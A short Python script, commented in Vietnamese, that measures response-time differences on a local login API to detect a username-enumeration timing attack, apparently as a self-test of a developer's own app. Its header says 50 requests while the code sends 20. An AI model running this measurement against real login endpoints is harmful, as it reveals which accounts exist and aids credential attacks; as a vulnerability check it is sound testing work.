# HƯỚNG DẪN ĐO ĐỘ LỆCH THỜI GIAN[cite: 54, 55]:
# Workflow:
# Vòng lặp 1: Gửi 50 request tới tài khoản 'admin' (Có trong DB) -> Tính Average Time 1.
# Vòng lặp 2: Gửi 50 request tới tài khoản 'no_exist' (Không có trong DB) -> Tính Average Time 2.
# Khẳng định lỗ hổng dựa trên Delta = (Time 1 - Time 2).


import requests
import time

URL = "http://127.0.0.1:8000/api/auth/login"
NUM_REQUESTS = 20

def measure_time(username, password):
    times = []
    for _ in range(NUM_REQUESTS):
        start = time.time()
        requests.post(URL, json={"username": username, "password": password})
        # Ghi nhận thời gian phản hồi của từng request
        times.append(time.time() - start)
    # Trả về thời gian trung bình
    return sum(times) / len(times)

def run_attack():
    print("⏱️ BẮT ĐẦU ĐO TIMING ATTACK ⏱️\n")
    
    # 1. Đo tài khoản CÓ THẬT (sẽ tốn thời gian băm mật khẩu)
    print(f"Đang gửi {NUM_REQUESTS} requests cho tài khoản CÓ THẬT (duong_test)...")
    time_exist = measure_time("duong_test", "wrong_password")
    
    # 2. Đo tài khoản KHÔNG TỒN TẠI (sẽ văng lỗi ngay lập tức)
    print(f"Đang gửi {NUM_REQUESTS} requests cho tài khoản KHÔNG TỒN TẠI (ghost_user)...")
    time_not_exist = measure_time("ghost_user", "wrong_password")
    
    print("\n📊 KẾT QUẢ ĐO ĐẠC:")
    print(f"- Thời gian phản hồi User TỒN TẠI:      {time_exist:.4f} giây")
    print(f"- Thời gian phản hồi User KHÔNG TỒN TẠI: {time_not_exist:.4f} giây")
    
    delta = abs(time_exist - time_not_exist)
    print(f"\n=> ĐỘ LỆCH THỜI GIAN (Delta): {delta:.4f} giây")
    
    if delta > 0.003: # Chênh lệch hơn 3ms (0.003s) là đủ để Hacker phân biệt
        print("🚨 KẾT LUẬN: HỆ THỐNG CÓ LỖ HỔNG TIMING ATTACK (Hacker có thể dò được User)!")
    else:
        print("🛡️ KẾT LUẬN: HỆ THỐNG AN TOÀN (Thời gian đã được cân bằng, không thể đoán được)!")

if __name__ == "__main__":
    run_attack()